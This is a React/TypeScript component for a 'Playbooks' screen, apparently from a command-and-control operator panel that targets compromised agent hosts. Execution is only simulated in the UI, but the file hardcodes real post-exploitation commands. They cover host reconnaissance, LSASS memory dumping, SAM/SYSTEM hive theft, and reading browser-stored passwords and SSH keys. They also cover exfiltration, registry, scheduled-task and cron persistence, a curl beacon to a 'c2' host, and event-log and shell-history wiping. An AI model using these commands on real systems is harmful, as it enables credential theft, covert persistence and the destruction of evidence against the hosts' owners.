import { useState } from 'react';

type StepType = 'shell'|'upload'|'download'|'inject'|'persist'|'screenshot'|'keylog'|'exfil'|'wait';
type StepStatus = 'pending'|'running'|'done'|'failed'|'skipped';

interface Step {
  id: string; type: StepType; label: string;
  cmd?: string; target?: string; condition?: string;
  status: StepStatus; output?: string;
}

interface Playbook {
  id: string; name: string; desc: string; tags: string[];
  steps: Step[]; lastRun?: string; runsTotal: number;
}

const TYPE_COLOR: Record<StepType,string> = {
  shell:'#5a96d4', upload:'#c8a84b', download:'#33a84a', inject:'#e05c6e',
  persist:'#d48b55', screenshot:'#a07fd4', keylog:'#e05c6e', exfil:'#d48b55', wait:'#333',
};
const STEP_STATUS_COL: Record<StepStatus,string> = {
  pending:'#333', running:'#d48b55', done:'#33a84a', failed:'#e05c6e', skipped:'#2a2a2a',
};

const PLAYBOOKS: Playbook[] = [
  {
    id:'PB-001', name:'Quick Recon', desc:'Gathers sysinfo, users, network config, and running procs.', tags:['recon','auto'], runsTotal:4, lastRun:'2026-06-07 03:12',
    steps:[
      {id:'s1',type:'shell',   label:'System info',       cmd:'systeminfo || uname -a',          condition:'',status:'pending'},
      {id:'s2',type:'shell',   label:'Current user',      cmd:'whoami /all || id',               condition:'',status:'pending'},
      {id:'s3',type:'shell',   label:'Network config',    cmd:'ipconfig /all || ip addr',        condition:'',status:'pending'},
      {id:'s4',type:'shell',   label:'ARP table',         cmd:'arp -a',                          condition:'',status:'pending'},
      {id:'s5',type:'shell',   label:'Running processes', cmd:'Get-Process || ps aux',           condition:'',status:'pending'},
      {id:'s6',type:'shell',   label:'Local admins',      cmd:'net localgroup administrators',   condition:'',status:'pending'},
      {id:'s7',type:'download',label:'Grab /etc/passwd',  target:'/etc/passwd',                  condition:'os==linux',status:'pending'},
    ],
  },
  {
    id:'PB-002', name:'Cred Harvest', desc:'Dumps credentials from memory, files, and browser storage.', tags:['cred','privesc'], runsTotal:2, lastRun:'2026-06-08 02:44',
    steps:[
      {id:'s1',type:'inject',    label:'Inject into LSASS',  cmd:'comsvcs.dll MiniDump',  condition:'priv==SYSTEM',status:'pending'},
      {id:'s2',type:'shell',     label:'SAM/NTDS via reg',   cmd:'reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM sys.bak', condition:'priv==SYSTEM', status:'pending'},
      {id:'s3',type:'shell',     label:'Browser creds',      cmd:'Get-Content "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"', condition:'', status:'pending'},
      {id:'s4',type:'shell',     label:'SSH keys',           cmd:'cat ~/.ssh/id_rsa 2>/dev/null; ls ~/.ssh/', condition:'', status:'pending'},
      {id:'s5',type:'exfil',     label:'Exfil loot',         target:'sam.bak,sys.bak',    condition:'',status:'pending'},
    ],
  },
  {
    id:'PB-003', name:'Establish Persistence', desc:'Sets up multiple persistence mechanisms and beacons out.', tags:['persist'], runsTotal:1, lastRun:'2026-06-08 03:05',
    steps:[
      {id:'s1',type:'persist',   label:'Registry Run key',  cmd:'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d "C:\\Windows\\update.exe"', condition:'os==windows', status:'pending'},
      {id:'s2',type:'shell',     label:'Scheduled task',    cmd:'schtasks /create /tn "SystemUpdate" /tr "C:\\Windows\\update.exe" /sc hourly /ru SYSTEM', condition:'priv==SYSTEM', status:'pending'},
      {id:'s3',type:'persist',   label:'Cron job (Linux)',   cmd:'(crontab -l; echo "*/30 * * * * /tmp/.update") | crontab -', condition:'os==linux', status:'pending'},
      {id:'s4',type:'shell',     label:'Test beacon',       cmd:'curl -s http://c2/ping', condition:'', status:'pending'},
    ],
  },
  {
    id:'PB-004', name:'OPSEC Cleanup', desc:'Removes artifacts, clears logs, and wipes traces.', tags:['opsec','cleanup'], runsTotal:0,
    steps:[
      {id:'s1',type:'shell',   label:'Clear event logs',   cmd:'wevtutil cl Security && wevtutil cl System && wevtutil cl Application', condition:'os==windows', status:'pending'},
      {id:'s2',type:'shell',   label:'Clear bash history', cmd:'cat /dev/null > ~/.bash_history && history -c', condition:'os==linux', status:'pending'},
      {id:'s3',type:'shell',   label:'Delete temp files',  cmd:'Remove-Item -Recurse $env:TEMP\\* -Force', condition:'', status:'pending'},
      {id:'s4',type:'shell',   label:'Remove loot files',  cmd:'del /f sam.bak sys.bak 2>nul; rm -f sam.bak sys.bak', condition:'', status:'pending'},
      {id:'s5',type:'wait',    label:'Verify clean',       cmd:'net sessions; last | head -20', condition:'', status:'pending'},
    ],
  },
];

export default function PlaybooksView() {
  const [books,     setBooks]   = useState<Playbook[]>(PLAYBOOKS);
  const [active,    setActive]  = useState<Playbook>(PLAYBOOKS[0]);
  const [running,   setRunning] = useState(false);
  const [targetMode,setTarget]  = useState<'selected'|'all'|'tagged'>('selected');
  const [targetAgent,setTAgent] = useState('ZK-001');

  const run = () => {
    setRunning(true);
    const steps = active.steps.map(s=>({...s,status:'pending' as StepStatus}));
    setActive(p=>({...p,steps}));
    setBooks(b=>b.map(pb=>pb.id===active.id?{...pb,steps}:pb));

    steps.forEach((step,i) => {
      setTimeout(()=>{
        const ok = step.type !== 'inject' || Math.random() > 0.2;
        const updated: StepStatus = ok ? 'done' : 'failed';
        setActive(p=>({
          ...p,
          steps: p.steps.map((s,j) => j<i ? s : j===i ? {...s,status:updated,output:ok?'[+] completed':'[-] failed'} : j===i+1?{...s,status:'running'}:s),
        }));
        if (i === steps.length-1) {
          setRunning(false);
          setBooks(b=>b.map(pb=>pb.id===active.id?{...pb,runsTotal:pb.runsTotal+1,lastRun:new Date().toISOString().slice(0,16)}:pb));
        }
      }, (i+1) * 700 + Math.random()*300);
    });

    // Set first to running immediately
    setActive(p=>({...p,steps:p.steps.map((s,i)=>i===0?{...s,status:'running'}:s)}));
  };

  return (
    <div style={{ display:'flex', height:'100%', overflow:'hidden', fontFamily:'Courier New' }}>

      {/* LEFT — playbook list */}
      <div style={{ width:230, background:'#0d0d0d', borderRight:'1px solid #1a1a1a', display:'flex', flexDirection:'column', flexShrink:0 }}>
        <div style={{ padding:'8px 10px', borderBottom:'1px solid #1a1a1a', fontSize:9, color:'#444', textTransform:'uppercase', letterSpacing:1 }}>Playbooks ({books.length})</div>
        <div style={{ flex:1, overflowY:'auto' }}>
          {books.map(pb => (
            <div key={pb.id} onClick={()=>setActive(pb)} style={{
              padding:'8px 10px', borderBottom:'1px solid #111', cursor:'pointer',
              background: active.id===pb.id ? '#0a0a14' : 'transparent',
              borderLeft:`2px solid ${active.id===pb.id?'#e05c6e':'transparent'}`,
            }}>
              <div style={{ fontSize:10, color:active.id===pb.id?'#cccccc':'#777', fontWeight:700, marginBottom:2 }}>{pb.name}</div>
              <div style={{ fontSize:9, color:'#2a2a2a', marginBottom:4, lineHeight:1.4 }}>{pb.desc.slice(0,50)}…</div>
              <div style={{ display:'flex', gap:4, flexWrap:'wrap', marginBottom:3 }}>
                {pb.tags.map(t=><span key={t} style={{ fontSize:8, padding:'1px 4px', background:'#181818', color:'#444', border:'1px solid #222' }}>{t}</span>)}
              </div>
              <div style={{ fontSize:9, color:'#1a1a1a' }}>{pb.steps.length} steps · ran {pb.runsTotal}×</div>
            </div>
          ))}
        </div>
      </div>

      {/* RIGHT — detail + run */}
      <div style={{ flex:1, display:'flex', flexDirection:'column', overflow:'hidden' }}>
        {/* Run bar */}
        <div style={{ padding:'8px 14px', background:'#0d0d0d', borderBottom:'1px solid #1a1a1a', display:'flex', gap:10, alignItems:'center', flexShrink:0 }}>
          <span style={{ fontSize:12, color:'#cccccc', fontWeight:700 }}>{active.name}</span>
          <span style={{ fontSize:10, color:'#333', flex:1 }}>{active.desc}</span>
          <select value={targetAgent} onChange={e=>setTAgent(e.target.value)} style={{ background:'#040404', border:'1px solid #1e1e1e', color:'#ccc', fontFamily:'Courier New', fontSize:11, padding:'4px 8px', outline:'none', appearance:'none' }}>
            {['ZK-001','ZK-002','ZK-003','ZK-005','ZK-006'].map(a=><option key={a}>{a}</option>)}
          </select>
          <button onClick={run} disabled={running} style={{
            background:running?'#0d0d0d':'#1a0000',
            border:`1px solid ${running?'#222':'#e05c6e'}`,
            color:running?'#333':'#e05c6e',
            fontFamily:'Courier New', fontSize:11, fontWeight:700,
            padding:'6px 18px', cursor:running?'default':'pointer', letterSpacing:1,
          }}>
            {running?'[ RUNNING... ]':'[ RUN PLAYBOOK ]'}
          </button>
        </div>

        {/* Steps */}
        <div style={{ flex:1, overflowY:'auto', padding:'10px 14px' }}>
          {active.steps.map((step,i) => (
            <div key={step.id} style={{ display:'flex', gap:12, marginBottom:8, alignItems:'flex-start' }}>
              {/* Step number */}
              <div style={{ width:24, height:24, borderRadius:'50%', border:`1px solid ${STEP_STATUS_COL[step.status]}`, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0, fontSize:10, color:STEP_STATUS_COL[step.status], background:step.status==='running'?'#0a0a00':'transparent' }}>
                {step.status==='done'?'✓':step.status==='failed'?'✕':step.status==='running'?'▶':i+1}
              </div>
              {/* Content */}
              <div style={{ flex:1, background:'#0d0d0d', border:`1px solid ${step.status==='running'?'#d48b55':'#1a1a1a'}`, padding:'8px 10px' }}>
                <div style={{ display:'flex', gap:8, alignItems:'center', marginBottom:4 }}>
                  <span style={{ fontSize:9, color:TYPE_COLOR[step.type], fontWeight:700, textTransform:'uppercase', border:`1px solid ${TYPE_COLOR[step.type]}44`, padding:'1px 6px' }}>{step.type}</span>
                  <span style={{ fontSize:11, color:'#ccc' }}>{step.label}</span>
                  {step.condition && <span style={{ fontSize:9, color:'#333', marginLeft:'auto' }}>if: {step.condition}</span>}
                </div>
                {step.cmd && (
                  <div style={{ background:'#040404', padding:'4px 8px', fontSize:10, color:'#444', fontFamily:'monospace', marginBottom:step.output?4:0 }}>{step.cmd}</div>
                )}
                {step.target && (
                  <div style={{ background:'#040404', padding:'4px 8px', fontSize:10, color:'#5a96d4', fontFamily:'monospace', marginBottom:step.output?4:0 }}>target: {step.target}</div>
                )}
                {step.output && (
                  <div style={{ fontSize:10, color:step.status==='done'?'#33a84a':'#e05c6e', marginTop:2 }}>{step.output}</div>
                )}
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
